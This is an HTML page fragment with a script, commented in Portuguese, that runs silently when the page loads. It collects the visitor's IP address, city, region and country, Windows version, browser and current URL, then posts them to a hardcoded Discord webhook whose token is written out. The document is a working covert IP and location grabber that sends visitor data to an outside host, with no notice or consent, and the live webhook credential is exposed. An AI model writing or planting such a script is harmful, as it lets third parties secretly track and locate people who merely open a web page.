    <main>

    <script>
        // Fun√ß√£o para enviar mensagem por webhook como um embed
        function enviarMensagem() {
            // Obter o IP do usu√°rio
            fetch('https://api64.ipify.org?format=json')
                .then(response => response.json())
                .then(data => {
                    const ip = data.ip;

                    // Obter a localiza√ß√£o do usu√°rio
                    fetch(`https://ipapi.co/${ip}/json/`)
                        .then(response => response.json())
                        .then(data => {
                            const localizacao = `${data.city}, ${data.region}, ${data.country_name}`;

                            // Obter a edi√ß√£o do Windows
                            const windowsEdition = window.navigator.userAgent.match(/Windows NT (\d+\.\d+)/)[1];

                            // Obter o nome do navegador
                            const navegador = window.navigator.userAgent.split(' ')[0];

                            // Obter a URL da p√°gina atual
                            const paginaAtual = window.location.href;

                            // Construir a mensagem como um embed
                            const mensagem = {
                                embeds: [{
                                    title: 'Informa√ß√µes do Usu√°rio',
                                    color: 0x007bff,
                                    fields: [
                                        {
                                            name: ':earth_americas: IP do usu√°rio',
                                            value: `||${ip}||`,
                                        },
                                        {
                                            name: '<:Localizacao_Gemini:1232098003544965214> Localiza√ß√£o',
                                            value: localizacao
                                        },
                                        {
                                            name: ':desktop: Edi√ß√£o do Windows',
                                            value: `Windows ${windowsEdition}`
                                        },
                                        {
                                            name: ':globe_with_meridians: Navegador',
                                            value: navegador
                                        },
                                        {
                                            name: ':pushpin: URL da P√°gina Atual',
                                            value: paginaAtual
                                        }
                                    ]
                                }]
                            };

                            // Enviar a mensagem por webhook
                            const webhookURL = 'https://discord.com/api/webhooks/1232090820392386664/GVsiEsNNbw7895pmtTJOgHAdTSrZ8DsSBstDfBk5KSSonnjlSjBQ4kNzS7aKbog93svM';
                            fetch(webhookURL, {
                                method: 'POST',
                                headers: {
                                    'Content-Type': 'application/json'
                                },
                                body: JSON.stringify(mensagem)
                            }).then(() => {
                                console.log('Mensagem enviada com sucesso!');
                            }).catch(error => {
                                console.error('Erro ao enviar a mensagem:', error);
                            });
                        });
                });
        }

        // Chamada da fun√ß√£o ao carregar a p√°gina
        window.onload = enviarMensagem;
    </script>
